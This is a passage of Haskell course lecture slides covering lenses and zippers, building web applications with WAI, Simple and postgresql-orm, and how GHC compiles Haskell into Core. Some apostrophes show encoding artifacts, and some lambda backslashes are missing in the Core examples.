   editSnd f (a,b) = (a, f b)

And here, it‚Äôs in the first.

.. code:: haskell

   editFst :: (a -> c) -> (a,b) -> (c,b)
   editFst f (a,b) = (f a, b)

Counting holes
==============

If we drop the ``b`` from ``(a,b)``, how many values does the resulting
pseudo-type have?

.. _counting-holes-1:

Counting holes
==============

If we drop the ``b`` from ``(a,b)``, how many values does the resulting
pseudo-type have?

What if we drop ``a`` from ``(a,b)``?

.. _counting-holes-2:

Counting holes
==============

If we drop the ``b`` from ``(a,b)``, how many values does the resulting
pseudo-type have?

What if we drop ``a`` from ``(a,b)``?

If we want to drop some arbitrary field from ``(a,b,c)``, we can
represent this via a type.

.. code:: haskell

   data Hole3 a b c = AHole b c
                    | BHole a c
                    | CHole a b

.. _counting-holes-3:

Counting holes
==============

We can write the number of values of ``(x,x,x)`` as
:math:`x \times x \times
x`, or :math:`x^3`.

If we substitute ``x`` for ``a``, ``b``, and ``c`` below, how many
different values of type ``Hole3`` can there be?

.. code:: haskell

   data Hole3 a b c = AHole b c
                    | BHole a c
                    | CHole a b

.. _counting-holes-4:

Counting holes
==============

We can write the number of values of ``(x,x,x)`` as
:math:`x \times x \times
x`, or :math:`x^3`.

If we substitute ``x`` for ``a``, ``b``, and ``c`` below, how many
different values of type ``Hole3`` can there be?

.. code:: haskell

   data Hole3 x x x = AHole x x
                    | BHole x x
                    | CHole x x

Hmm, that‚Äôs :math:`3x^2`.

Does this remind you of symbolic differentiation?

Back to pairs
=============

Here‚Äôs a hole type for pairs.

.. code:: haskell

   data PairHole a b = HoleFst b
                     | HoleSnd a

If we pull a value out of the hole, we need to store it somewhere so we
can work with it.

.. code:: haskell

   data PairZipper a b c = PZ c (PairHole a b)

Why do we have an extra type parameter ``c``?

-  So we can choose what type of value to store in the hole later.

Quick exercise
==============

Please provide bodies for the two undefined functions below.

You have one minute.

.. code:: haskell

   data PairHole a b = HoleFst b
                     | HoleSnd a

   data PairZipper a b c = PZ c (PairHole a b)

   focusFst :: (a,b) -> PairZipper a b a
   focusFst = undefined

   focusSnd :: (a,b) -> PairZipper a b b
   focusSnd = undefined

Skeleton: http://cs240h.scs.stanford.edu/Hole1.hs

My solution
===========

.. code:: haskell

   data PairHole a b = HoleFst b
                     | HoleSnd a

   data PairZipper a b c = PZ c (PairHole a b)

   focusFst :: (a,b) -> PairZipper a b a
   focusFst (a,b) = PZ a (HoleFst b)

   focusSnd :: (a,b) -> PairZipper a b b
   focusSnd (a,b) = PZ b (HoleSnd a)

A nice thing about this?

-  The polymorphism forces there to be only one possible implementation.

The inverse conversion
======================

We obviously also need to be able to convert from a zipper back to a
pair.

.. code:: haskell

   unfocusFst :: PairZipper a b a -> (a,b)
   unfocusFst (PZ a (HoleFst b)) = (a,b)

   unfocusSnd :: PairZipper a b b -> (a,b)
   unfocusSnd (PZ b (HoleSnd a)) = (a,b)

Accessing the focused value
===========================

Now that we have focus functions to get the first or second element of a
pair, we can write a generic accessor function for our zipper type.

.. code:: haskell

   view :: PairZipper a b c -> c
   view (PZ c _) = c

Try in ``ghci``:

.. code:: haskell

   >>> view (focusFst ("hello",1))
   "hello"
   >>> view (focusSnd ("hello",1))
   1

Editing the focused value
=========================

This is the more fun part.

.. code:: haskell

   over :: (c -> c)
        -> PairZipper a b c
        -> PairZipper a b c
   over f (PZ c l) = PZ (f c) l

Once again in ``ghci``:

.. code:: haskell

   >>> unfocusSnd . over succ . focusSnd $ ("hello",1::Int)
   ("hello",2)

Editing part deux
=================

What will this print in ``ghci``?

.. code:: haskell

   >>> unfocusFst . over length . focusFst $ ("hello",1::Int)

.. _editing-part-deux-1:

Editing part deux
=================

What will this print in ``ghci``?

.. code:: haskell

   >>> unfocusFst . over length . focusFst $ ("hello",1::Int)

It‚Äôs a type error! ``over`` is not polymorphic enough.

Bad version:

.. code:: haskell

   over :: (c -> c)
        -> PairZipper a b c
        -> PairZipper a b c
   over f (PZ c l) = PZ (f c) l

The good version allows editing to change the type of the field being
edited:

.. code:: haskell

   over :: (c -> d)
        -> PairZipper a b c
        -> PairZipper a b d
   over f (PZ c l) = PZ (f c) l

Hmm
===

This approach has problems.

We have to specify what field we‚Äôre focusing at both ends of the
‚Äúpipeline‚Äù.

-  This is repetitive.

Can we compose these so that we can ‚ÄòfocusFst‚Äô then ‚ÄòfocusSnd‚Äô to get
another zipper?

-  No.

Gluing things together
======================

Instead of keeping ``focusFst`` and ``unfocusFst`` separate and wiring
them together by hand, let‚Äôs manage them automatically.

.. code:: haskell

   data Focused t a b = Focused {
       focused :: a
     , rebuild :: b -> t
     }

A ``Focused`` is a pair consisting of:

-  The focused element

-  A function that knows how to reconstitute the original value

.. code:: haskell

   type Focuser s t a b = s -> Focused t a b

A ``Focuser`` is a function that takes a value and gives us a
``Focused``.

Why so polymorphic?
===================

Recall that our original definition of ``over`` wasn‚Äôt polymorphic
enough.

We could not change the type of the first element while editing a pair.

.. code:: haskell

   >>> unfocusFst . over length . focusFst $ ("hello",1::Int)

Well, ``Focused`` and ``Focuser`` have so many type parameters to give
exactly this generality.

Another look
============

.. code:: haskell

   data Focused t a b = Focused {
       focused :: a
     , rebuild :: b -> t
     }

``Focused`` is in effect saying:

-  I am focusing on an ``a``

-  I might change its type to ``b``

-  When I am eventually done focusing, I will give you back a ``t``
   (which is ``s`` with every ``a`` replaced with ``b``)

.. _another-look-1:

Another look
============

.. code:: haskell

   type Focuser s t a b = s -> Focused t a b

The ‚Äúmeaning‚Äù of ``Focuser`` is:

-  You give me an ``s``

-  I will focus on an ``a``

-  I might change its type to ``b``

-  When I‚Äôm done focusing, I might change the thing I give you back from
   ``s`` to ``t`` (once again ``s`` with every ``a`` replaced with
   ``b``)

Some machinery
==============

Functions for working with these types:

.. code:: haskell

   unfocus :: Focused s a a -> s
   unfocus (Focused focused rebuild) = rebuild focused

   view :: Focuser s t a b -> s -> a
   view l s = focused (l s)

   over :: Focuser s t a b -> (a -> b) -> s -> t
   over l f s = let Focused focused rebuild = l s
                in rebuild (f focused)

Our friends ``focusFst`` and ``focusSnd`` recast in this framework:

.. code:: haskell

   _1 :: Focuser (a,b) (c,b) a c
   _1 (a,b) = Focused a (\c -> (c,b))

   _2 :: Focuser (a,b) (a,c) b c
   _2 (a,b) = Focused b (\c -> (a,c))

Your turn
=========

Here‚Äôs your scaffolding:

.. code:: haskell

   data Focused t a b = Focused {
       focused :: a
     , rebuild :: b -> t
     }

   type Focuser s t a b = s -> Focused t a b

Take two minutes to implement this:

.. code:: haskell

   focusHead :: Focuser [a] [a] a a
   focusHead = undefined

It should focus on the head of a list, such that we can run this in
``ghci``:

.. code:: haskell

   >>> over focusHead toUpper "anita"
   "Anita"

Skeleton: http://cs240h.scs.stanford.edu/Focus.hs

Abstracting again
=================

Our two most interesting functions have a lot in common.

.. code:: haskell

   over :: Focuser s t a b -> (a -> b) -> s -> t
   view :: Focuser s t a b             -> s -> a

How could we unify these types?

-  By using abstraction to decide what type to use.

.. code:: haskell

   wat :: Focuser s t a b -> (a -> f b) -> s -> f t

Type-level fun
==============

Here, ``f`` is a type-level function.

.. code:: haskell

   wat :: Focuser s t a b -> (a -> f b) -> s -> f t

If we supply the type-level identity function, ``f`` disappears and we
get out the type of ``over``:

.. code:: haskell

   wat  :: Focuser s t a b -> (a -> f b) -> s -> f t
   over :: Focuser s t a b -> (a ->   b) -> s ->   t

With the type-level ``const a`` function, we get the type of ``view``:

.. code:: haskell

   wat  :: Focuser s t a b -> (a -> f b) -> s -> f t
   view :: Focuser s t a b {- ignored -} -> s -> a

Type-level identity
===================

Defined in
```Data.Functor.Identity`` <http://hackage.haskell.org/package/transformers/docs/Data-Functor-Identity.html>`__:

.. code:: haskell

   newtype Identity a = Identity { runIdentity :: a }

   instance Functor Identity where
       fmap f (Identity a) = Identity (f a)

Type-level const
================

Defined in
```Control.Applicative`` <http://hackage.haskell.org/package/base/docs/Control-Applicative.html#v:Const>`__:

.. code:: haskell

   newtype Const a b = Const { getConst :: a }

   instance Functor (Const a) where
       fmap _ (Const v) = Const v

Our final type
==============

.. code:: haskell

   {-# LANGUAGE RankNTypes #-}

   type Lens s t a b = forall f. Functor f =>
                       (a -> f b) -> s -> f t

From our perspective as lens library writers:

We use ``forall`` here to make it clear that *we control* the
``Functor`` we use, not our caller.

We choose ``Identity`` or ``Const a`` to get the right types for
``over`` and ``view``.

.. _our-final-type-1:

Our final type
==============

.. code:: haskell

   {-# LANGUAGE RankNTypes #-}

   type Lens s t a b = forall f. Functor f =>
                       (a -> f b) -> s -> f t

From our perspective as lens library writers:

We have to explain this type to users.

-  Give me an ``s``, and I will focus on its elements of type ``a``

-  If you use ``over`` to edit, you can change those ``a`` types to
   ``b``

-  Once you‚Äôre done editing, you‚Äôll get back a ``t``, which (if you
   didn‚Äôt change ``a`` to ``b``) will be ``s``

New machinery
=============

.. code:: haskell

   {-# LANGUAGE RankNTypes #-}

   import Control.Applicative
   import Data.Functor.Identity

   type Lens s t a b = forall f. Functor f =>
                       (a -> f b) -> s -> f t

   over :: Lens s t a b -> (a -> b) -> s -> t
   over l f s = runIdentity (l (Identity . f) s)

   view :: Lens s t a b -> s -> a
   view l s = getConst (l Const s)

Tuple sections
==============

If we turn on this:

.. code:: haskell

   {-# LANGUAGE TupleSections #-}

And write this:

.. code:: haskell

   (a,)

It‚Äôs equivalent to this:

.. code:: haskell

   \b -> (a,b)

More machinery
==============

.. code:: haskell

   {-# LANGUAGE TupleSections #-}

   _1 :: Lens (a,b) (c,b) a c
   _1 f (a,b) = (,b) <$> f a

   _2 :: Lens (a,b) (a,c) b c
   _2 f (a,b) = (a,) <$> f b

   _head :: Lens [a] [a] a a
   _head f (a:as) = (:as) <$> f a

Composing access
================

In ``ghci``:

.. code:: haskell

   >>> view (_1 . _head) ("foo",True)
   'f'

Why is this different from the traditional order of composition?

.. code:: haskell

   >>> (head . fst) ("foo",True)
   'f'

Composition of lenses
=====================

What is a lens even *for*?

-  It turns an action on a *part* of a structure into an action on the
   *whole* structure.

Thus:

-  ``_1`` and ``_2`` are *not* ‚Äújust getters‚Äù, they take an *entire
   pair* and focus on its first or second element.

-  It‚Äôs ``view`` and ``over`` that then determine getter-or-setter
   nature.

What does it then mean to compose lenses?

If you write ``_1 . _head``, you are:

-  Taking the entire pair, and focusing on its first element

-  Taking the entire pair, and focusing on the head of the list *inside
   the first element of the pair*

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/a88.jpg

Composing modifications
=======================

Let‚Äôs work out how we would use the lens machinery to give us a pair
with an uppercased first name.

.. code:: haskell

   ("anita", True)

1: Why are lenses composable?
=============================

At first glance, it‚Äôs hard to tell why ``_1 . _head`` even typechecks:

.. code:: haskell

   _1    :: Functor f => (a -> f c) -> (a, b) -> f (c, b)
   _head :: Functor f => (a -> f a) -> [a] -> f [a]

And especially‚Äîwhy can we compose using ``.`` for function composition?

.. _why-are-lenses-composable-1:

2: Why are lenses composable?
=============================

The key: remembering that a function of 2 arguments is really a function
of 1 arg that returns a function.

.. code:: haskell

   _1 :: Functor f =>
         (a -> f c) ->
         ((a, b) -> f (c, b))

   _head :: Functor f =>
            (a -> f a) ->
            ([a] -> f [a])

   _1._head :: Functor f =>
               (a -> f a) ->
               ([a], b) -> f ([a], b)

What next?
==========

The best place to start is with the gateway drug:

-  The `lens-family-core
   package <http://hackage.haskell.org/package/lens-family-core>`__ is
   the easiest to learn

-  Also has the easiest source to read: highly recommended!

The full monty:

-  The `lens package <http://lens.github.io/>`__ is *way* more powerful,
   more abstract, more difficult to learn

-  A little controversial due to being huge

Becoming more widely used in practice:

-  My `wreq HTTP library <http://www.serpentine.com/wreq>`__

Spotter‚Äôs guide to lens operators
=================================

``^.`` is ``view`` (think ‚Äúgetter‚Äù)

``%~`` is ``over`` (think ‚Äúeditor‚Äù)

``.~`` is ``over`` ‚Äì but accepts a *value* instead of a *function*
(think ‚Äúsetter‚Äù)

``&`` is just ``$`` with arguments flipped

Used as follows:

.. code:: haskell

   foo & someField %~ ('a':)
       & otherField .~ 'b'

(‚ÄúThing being modified, followed by modifiers in a chain.‚Äù)


/L14 WEB
================

If you want to follow along on your laptop towards the end:

-  For ghc-7.6:

.. code:: bash

   $ cabal install simple wai-handler-devel

-  For ghc-7.8

.. code:: bash

   $ git clone git://github.com/alevy/simple.git
   $ git clone git://github.com/alevy/postgresql-orm.git
   $ cd simple
   $ cabal install
   $ cd ../postgresql-orm
   $ cabal install
   $ cabal install wai-handler-devel

You‚Äôll also need to have PostgreSQL installed

Agenda
======

1. Intro/motivation

2. Modeling a web application in Haskell

3. Build a content management system

Why should you care about web programming?
==========================================

   -  The WWW is starting to get *pretty* popular

..

   -  If you building something, there‚Äôs a good chance you‚Äôll deploy as
      a web app the internet

   -  Even if your application doesn‚Äôt seem very ‚Äúwebby‚Äù

..

   -  HTTP becoming prevelent general-purpose protocol for APIs (both
      internal and external)
   -  Good client support
   -  Good server-side support (frameworks, SSL, virtual domains‚Ä¶)
   -  Easy to ‚Äúsell‚Äù to management

How do you people write a web app?
==================================

-  Actually, that depends‚Ä¶

-  A busy space of frameworks

-  Used to be dominated by Java

   -  terms like ‚ÄúJava Servlet Container‚Äù, ‚ÄúJ2EE‚Äù, ‚ÄúEnterprise Java
      Beans‚Äù, ‚ÄúPOJO‚Äù

   -  everybody had a really bad experience with that in the late
      90s/early 2Ks

   -  Java is still the primary server-side language for, e.g. Google,
      Amazon

-  The cool kids are mostly using dynamic languages

   -  Ruby/Ruby on Rails/Sinatra

   -  Python/Django

   -  node.js/express

   -  PHP

   -  etc‚Ä¶

Web Programming - Most Popular Language Today?
==============================================

. . .

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/popular-web-lang.png

But why dynamic languages?
==========================

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/zoolander.jpg

.. _but-why-dynamic-languages-1:

But why dynamic languages?
==========================

Less verbose
------------

e.g. no type declerations

.. code:: ruby

   x = 123

   def incr(y)
     y + 1
   end

vs

.. code:: java

   protected static int x = 123;

   public static int incr(int y) {
     return y + 1;
   }

.. _but-why-dynamic-languages-2:

But why dynamic languages?
==========================

Advanced features
-----------------

like closures

.. code:: java

   Array.map(myarr, new Runnable() {
     public void run(int elm) {
       return elm * 42;
     }
   })

vs.

.. code:: ruby

   myarr.map {|elm| elm * 42}

.. _but-why-dynamic-languages-3:

But why dynamic languages?
==========================

Other less compelling reasons
-----------------------------

-  Fast development and prototyping

-  Dynamic language GOOD because *dynamic* web sites!

..

   | ‚ÄúWhen rendering web pages, often you have very many components
     interacting on a web page. You have buttons over here and little
     widgets over there and there are dozens of them on a webpage, as
     well as possibly dozens or hundreds of web pages on your website
     that are all **dynamic**. [‚Ä¶] using a statically typed language is
     actually quite inflexible. [‚Ä¶] like the whole system has to type
     check just to be able to move a button around‚Äù
   | - Nick Kallen from Twitter

Is it really about dynamism?
============================

No type declerations (but still typed)
--------------------------------------

.. code:: haskell

   x = 123 -- :: Num a => a

   incr y = y + 1 -- :: Num a => a -> a

Closures
--------

.. code:: haskell

   map (* 42) myarr

A lot of the arguments are really about weaknesses in Java et al.
-----------------------------------------------------------------

Modeling a web application in Haskell
=====================================

-  Claim: a web application does three things:

   1. parses a request from the client
   2. performs some side effects (e.g. reading/writing to a database)
   3. generates some response for the client

-  Given the following two types:

   .. code:: haskell

      data Request = Request {pathInfo :: [String], requestMethod :: Method, ...}

      data Response = Response Status [Header] String

-  Fill in the type for an ``Application``:

   .. code:: haskell

      type Application = ...

Boilerplate code:
`http://cs240h.scs.stanford.edu/Application.hs <Application.hs>`__

.. _modeling-a-web-application-in-haskell-1:

Modeling a web application in Haskell
=====================================

::

   ```haskell
   data Request = Request {pathInfo :: [String], requestMethod :: Method, ...}

   data Response = Response Status [Header] String

   type Application = Request -> IO Response
   ```

We‚Äôve just implemented the WAI package ‚Äì ‚ÄúWeb Application Interface‚Äù!
---------------------------------------------------------------------

The WAI package
===============

-  Common interface between servers and applications so you can
   mix-and-match

-  Servers:

   -  warp
   -  FastCGI
   -  wai-handler-devel (for development)

-  App frameworks:

   -  Yesod
   -  Scotty
   -  Hails (shameless plug)
   -  Simple (shameless plug)
   -  Others through adapters

.. _the-wai-package-1:

The WAI package
===============

.. code:: haskell

   data Request = Request {
        requestMethod        :: Method
     ,  httpVersion          :: HttpVersion
     ,  rawPathInfo          :: ByteString
     ,  rawQueryString       :: ByteString
     ,  requestHeaders       :: RequestHeaders
     ,  isSecure             :: Bool
     ,  remoteHost           :: SockAddr
     ,  pathInfo             :: [Text]
     ,  queryString          :: Query
     ,  requestBody          :: Source IO ByteString
     ,  vault                :: Vault
     ,  requestBodyLength    :: RequestBodyLength
     ,  requestHeaderHost    :: Maybe B.ByteString
     ,  requestHeaderRange   :: Maybe B.ByteString
     }

   data Response
       = ResponseFile Status ResponseHeaders FilePath (Maybe FilePart)
       | ResponseBuilder Status ResponseHeaders Builder
       | ResponseSource Status ResponseHeaders (forall b. WithSource IO (C.Flush Builder) b)
       | ResponseRaw (forall b. WithRawApp b) Response

   type Application = Request -> IO Response

A really simple application
===========================

Let‚Äôs build the simplest application that displays something in a
browser

-  First install ``wai`` and ``warp``:

.. code:: bash

   $ cabal install wai warp

-  Finally, build the app!

.. code:: haskell

   module Main where

   import qualified Data.ByteString.Lazy.Char8 as L8
   import Network.HTTP.Types
   import Network.Wai
   import Network.Wai.Handler.Warp (run)

   app :: Application
   app req = return $ responseLBS status200 [] $ L8.pack "Hello, World"

   main :: IO ()
   main = do
     run 3000 app

..

   -  Demo Time!

Let‚Äôs build a CMS!
==================

1. (Very) quick intro to *Simple*

2. (Very) quick intro to *postgresql-orm*

3. Write some code

*Simple* - a web framework in Haskell
=====================================

*Simple* is a web framework with one type:

.. code:: haskell

   newtype Controller s a = Controller {
     runController :: s -> Request -> IO (Either Response a, s)
     }

   instance Monad Controller
   instance Applicative Controller
   instance MonadIO Controller

-  Very small wrapper around WAI‚Äôs ``Application`` type

-  Let‚Äôs us refer to the ``Request`` anywhere without passing it around

-  Let‚Äôs us refer to some application state anywhere without passing it
   around

-  Let‚Äôs us decide we‚Äôre ready to respond and stop computing

Some *Simple* combinators
=========================

-  Stop computing and respond to a request:

.. code:: haskell

   respond :: Response -> Controller s a
   okHtml :: ByteString -> Response
   notFound :: Response

   respond $ okHtml "Hello world"

-  Get the request and app state:

.. code:: haskell

   request :: Controller s Request
   controllerState :: Controller s s

-  Parse query and form parameters:

.. code:: haskell

   queryParam' :: Parseable p => Controller s p
   parseForm :: Controller s ([Param], (ByteString, FileInfo ByteString))

.. _some-simple-combinators-1:

Some *Simple* combinators
=========================

-  Routing combinators:

.. code:: haskell

   -- Match on next dir in path
   routeName :: Text -> Controller s () -> Controller s ()
   routeName "articles" $ ...

   -- Treat first dir in path as query param
   routeVar :: Text -> Controller s () -> Controller s ()
   routeName "articles" $ routeVar "name" $ ...

   -- Match whole pattern of path
   routePattern :: Text -> Controller s () -> Controller s ()
   routePattern "/articles/:name" $ ...

   -- Match if no path left
   routeTop :: Controller s () -> Controller s ()

   -- Match on request method
   routeMethod :: Method -> Controller s () -> Controller s ()
   routeMethod GET $ routePatter "/articles/:name"

   -- Match hostname
   routeHost :: ByteString -> Controller s () -> Controller s ()

Higher-level *Simple* combinators
=================================

Common case is to match on method and a particular path pattern:

.. code:: haskell

   get :: Text -> Controller s () -> Controller s ()
   get ptrn ctrl = routeMethod GET $ routePattern ptrn ctrl

   post :: Text -> Controller s () -> Controller s ()
   post ptrn ctrl = routeMethod POST $ routePattern ptrn ctrl

So a typical small app might look like:

.. code:: haskell

   myapp :: Controller s ()
   myapp = do
     get "/" $ respond $ okHtml "Hello World"
     get "/foo" $ respond $ okHtml "bar"

PostgreSQL ORM
==============

-  Object relational mapper (ORM)

   -  maps from native types to SQL
   -  In our case maps to PostgreSQL flavored SQL

-  Haskell types must be of the form:

.. code:: haskell

   data Article = Article
     { articleId :: DBKey
     , articleTitle :: Text
     , articleBody :: Text
     , articleShortName :: Text }

-  Instances of the ``Model`` class:

.. code:: haskell

   class Model a where
     modelInfo :: ModelInfo a
     modelRead :: RowParser a
     modelWrite :: a -> [Action]

   data DBKey = DBKey !Int64 | NullKey

   data ModelInfo a = ModelInfo {
       modelTable :: ByteString
     , modelColumns :: [ByteString]
     , modelPrimaryColumn :: Int
     , modelGetPrimaryKey :: a -> DBKey }

.. _postgresql-orm-1:

PostgreSQL ORM
==============

-  If the ``Model`` derives ``Generic`` we don‚Äôt need to write an
   implementation

.. code:: haskell

   {-# LANGUAGE DeriveGeneric #-}
   import GHC.Generics

   data Article = Article
     { articleId :: DBKey
     , articleTitle :: Text
     , articleBody :: Text
     , articleShortName :: Text } deriving (Show, Generic)

   instance Model Article

-  This gives us access to:

.. code:: haskell

   save :: Model a => Connection -> a -> IO ()
   findAll :: Model a => Connection -> IO [a]
   findRow :: Model a => Connection -> DBRef a -> IO (Maybe a)

-  Because we‚Äôre in Haskell, let‚Äôs us avoid a bunch of edge cases:

   -  Fields cannot be null (unless they are a ``Maybe``)
   -  Fields cannot be different types (unless they are an ``Either``)
   -  Validation because redundant in many cases

OK, let‚Äôs get to coding:
========================

.. code:: bash

   $ cabal install simple
   $ smpl create my_cms



/L15 Haskell Compiler
=======================

Why understand how GHC works?
=============================

-  Understand Core & STG ‚Äì performance.
-  Familiarity with functional terminology.
-  Understand execution model ‚Äì reasonable cost model.

The pipeline of GHC
===================

Haskell -> GHC Haskell -> Core -> STG -> Cmm -> Assembly


GHC supports Haskell on top of an unsafe variant
================================================

Primitive types (GHC.Prim):

-  Char#, Int#, Word#, Double#, Float#
-  Array#, ByteArray#, ArrayArray#,
-  MutVar#, TVar#, MVar#
-  State#, exceptions

All primitive types are *unlifted* ‚Äì can‚Äôt contain :math:`\bot`.

.. _ghc-supports-haskell-on-top-of-an-unsafe-variant-1:

GHC supports Haskell on top of an unsafe variant
================================================

All variants of Int (In8, Int16, Int32, Int64) are represented
internally by Int# (64bit) on a 64bit machine.

.. code:: haskell

   data Int32 = I32# Int# deriving (Eq, Ord, Typeable)

   instance Num Int32 where
       (I32# x#) + (I32# y#)  = I32# (narrow32Int# (x# +# y#))
       ...

Data constructors *lift* a type, allowing :math:`\bot`.

GHC implements IO through the RealWorld token
=============================================

-  IO Monad is a state passing monad.

.. code:: haskell

   newtype IO a = IO (State# RealWorld -> (# State# RealWorld, a #))

   returnIO :: a -> IO a
   returnIO x = IO $  s -> (# s, x #)

   bindIO :: IO a -> (a -> IO b) -> IO b
   bindIO (IO m) k = IO $  s -> case m s of (# new_s, a #) -> unIO (k a) new_s

-  ``RealWorld`` token enforces ordering through data dependence.

.. code:: haskell

   unsafePerformIO :: IO a -> a
   unsafePerformIO m = unsafeDupablePerformIO (noDuplicate >> m)

   unsafeDupablePerformIO  :: IO a -> a
   unsafeDupablePerformIO (IO m) = lazy (case m realWorld# of (# _, r #) -> r)

-  Various unsafe functions throw away ``RealWorld`` token.

Core: a small function intermediate language
============================================

-  Idea: map Haskell to a small lanuage for easier optimization and
   compilation.

-  Functional lazy language

-  It consists of only a hand full of constructs!

::

   variables, literals, let, case, lambda abstraction, application

-  In general think, ``let`` means allocation, ``case`` means
   evaluation.

Core in one slide
=================

.. code:: haskell

   data Expr b -- "b" for the type of binders, 
     = Var    Id
     | Lit   Literal
     | App   (Expr b) (Arg b)
     | Lam   b (Expr b)
     | Let   (Bind b) (Expr b)
     | Case  (Expr b) b Type [Alt b]

     | Type  Type
     | Cast  (Expr b) Coercion
     | Coercion Coercion

     | Tick  (Tickish Id) (Expr b)

   data Bind b = NonRec b (Expr b)
               | Rec [(b, (Expr b))]

   type Arg b = Expr b

   type Alt b = (AltCon, [b], Expr b)

   data AltCon = DataAlt DataCon | LitAlt  Literal | DEFAULT

Lets now look at how Haskell is compiled to 
`Core <http://hackage.haskell.org/trac/ghc/wiki/Commentary/Compiler/CoreSynType>`__.

GHC Haskell to Core: monomorphic functions
==========================================

Haskell 

.. code:: haskell

   idChar :: Char -> Char
   idChar c = c

Core 

.. code:: haskell

   idChar :: GHC.Types.Char -> GHC.Types.Char
   [GblId, Arity=1, Caf=NoCafRefs]
   idChar =  (c :: GHC.Types.Char) -> c

GHC Haskell to Core: polymorphic functions
==========================================

Haskell 

.. code:: haskell

   id :: a -> a
   id x = x

   idChar2 :: Char -> Char
   idChar2 = id

Core 

.. code:: haskell

   id :: forall a. a -> a
   id =  (@ a) (x :: a) -> x

   idChar2 :: GHC.Types.Char -> GHC.Types.Char
   idChar2 = id @ GHC.Types.Char

.. raw:: html

   <!--
   * [GblId...] specifies various metadata about the function
   * Functions are all lambda abstractions
   * Explicit passing and instantiation of type variables
       * type variables are proceeded by @ symbol (read them as 'at type
         ...')
       * they are passed abstracted and passed around just like value
         variables
       * this is known as second order lambda calculus
       * GHC uses this representation because it makes preserving type
         information during optimization easy
   -->

.. _ghc-haskell-to-core-polymorphic-functions-1:

GHC Haskell to Core: polymorphic functions
==========================================

Haskell 

.. code:: haskell

   map :: (a -> b) -> [a] -> [b]
   map _ []     = []
   map f (x:xs) = f x : map f xs

Core 

.. code:: haskell

   map :: forall a b. (a -> b) -> [a] -> [b]
   map =  (@ a) (@ b) (f :: a -> b) (xs :: [a]) ->
       case xs of _ {
         []     -> GHC.Types.[] @ b;
         : y ys -> GHC.Types.: @ b (f y) (map @ a @ b f ys)
       }

.. 
   * case statements are only place evaluation happens, read them as
     'evaluate'
       * they take an extra variable just after `of` that captures the
         return value of the scrutinee
   * names are fully qualified

New case syntax to make obvious that evaluation is happening:

.. code:: haskell

   case e of result {
     __DEFAULT -> result
   }

Where transformed to let
========================

Haskell 

.. code:: haskell

   dox :: Int -> Int
   dox n = x * x
       where x = n + 2

Core 

.. code:: haskell

   dox :: GHC.Types.Int -> GHC.Types.Int
   dox =  (n :: GHC.Types.Int) ->
       let {
         x :: GHC.Types.Int
         x = GHC.base.plusInt n (GHC.Types.I# 2)
       }
       in GHC.base.multInt x x

Patterns matching transformed to case statements
================================================

Haskell 

.. code:: haskell

   iff :: Bool -> a -> a -> a
   iff True  x _ = x
   iff False _ y = y

Core 

.. code:: haskell

   iff :: forall a. GHC.Bool.Bool -> a -> a -> a
   iff =  (@ a) (d :: GHC.Bool.Bool) (x :: a) (y :: a) ->
       case d of _
         GHC.Bool.False -> y
         GHC.Bool.True  -> x

Type classes transformed to dictionaries
========================================

Haskell 

.. code:: haskell

   typeclass MyEnum a where
      toId  :: a -> Int
      fromId :: Int -> a

Core 

.. code:: haskell

   data MyEnum a = DMyEnum (a -> Int) (Int -> a)

   toId :: forall a. MyEnum a => a -> GHC.Types.Int
   toId =  (@ a) (d :: MyEnum a) (x :: a) ->
       case d of _
         DMyEnum f1 _ -> f1 x

   fromId :: forall a. MyEnum a => GHC.Types.Int -> a
   fromId =  (@ a) (d :: MyEnum a) (x :: a) ->
       case d of _
         DMyEnum _ f2 -> f2 x

.. raw:: html

   <!--
   * Typeclasses are implemented via _dictionaries_
       * Just a data structure storing the various functions for each field
       * Functions that have type class constraints take an extra dictionary argument
       * GHC will optimize away this dictionary passing when it can
   -->

A dictionary constructed for each instance
==========================================

Haskell 

.. code:: haskell

   instance MyEnum Int where
      toId = id
      fromId = id

Core 

.. code:: haskell

   fMyEnumInt :: MyEnum GHC.Types.Int
   fMyEnumInt =
       DMyEnum @ GHC.Types.Int
         (id @ GHC.Types.Int)
         (id @ GHC.Types.Int)

Dictionaries constructed from dictionaries
==========================================

Haskell 

.. code:: haskell

   instance (MyEnum a) => MyEnum (Maybe a) where
      toId (Nothing) = 0
      toId (Just n)  = toId n
      fromId 0       = Nothing
      fromId n       = Just $ fromId n

Core 

.. code:: haskell

   fMyEnumMaybe :: forall a. MyEnum a => MyEnum (Maybe a)
   fMyEnumMaybe =  (@ a) (dict :: MyEnum a) ->
       DMyEnum @ (Maybe a)
         (fMyEnumMaybe_ctoId @ a dict)
         (fMyEnumMaybe_cfromId @ a dict)

   fMyEnumMaybe_ctoId :: forall a. MyEnum a => Maybe a -> Int
   fMyEnumMaybe_ctoId =  (@ a) (dict :: MyEnum a) (mx :: Maybe a) ->
       case mx of _
         Nothing -> I# 0
         Just n  -> case (toId @ a dict n) of _ 
                       I# y -> I# (1 +# y)

UNPACK unboxes types
====================

Haskell 

.. code:: haskell

   data Point = Point {-# UNPACK #-} !Int
                      {-# UNPACK #-} !Int

Core 

.. code:: haskell

   data Point = Point Int# Int#

-  Only one data type for Point exists, GHC doesn‚Äôt duplicate it.

UNPACK not always a good idea
=============================

Haskell 

.. code:: haskell

   addP :: P -> Int
   addP (P x y ) = x + y

Core 

.. code:: haskell

   addP :: P -> Int
   addP =  (p :: P) -> 
       case p of _ {
         P x y -> case +# x y of z {
           __DEFAULT -> I# z
         }
       }

-  Great code here as working with unboxed types.

.. _unpack-not-always-a-good-idea-1:

UNPACK not always a good idea
=============================

Haskell 

.. code:: haskell

   module M where

   {-# NOINLINE add #-}
   add x y = x + y

   module P where

   addP_bad (P x y) = add x y

Core 

.. code:: haskell

   addP_bad =  (p :: P) ->
       case p of _ {
         P x y ->
           let { x' = I# x
                 y' = I# y 
           } in M.add x' y'
       }

-  Need to unfortunately rebox the types.

Core Summary
============

-  Look at Core to get an idea of how your code will perform.
-  Can see boxing an unboxing.
-  Language still lazy but ``case`` means evaluation.

Middle of GHC: *Core -> Core*
=============================

A lot of the optimizations that GHC does is through core to core
transformations.

Lets look at two of them:

-  Strictness and unboxing
-  SpecConstr

::

   Fun Fact: Estimated that functional languages gain 20 - 40%
   improvement from inlining Vs. imperative languages which gain 10 - 15%

Strictness & Unboxing
=====================

Consider this factorial implementation in Haskell:

.. code:: haskell

   fac :: Int -> Int -> Int
   fac x 0 = a
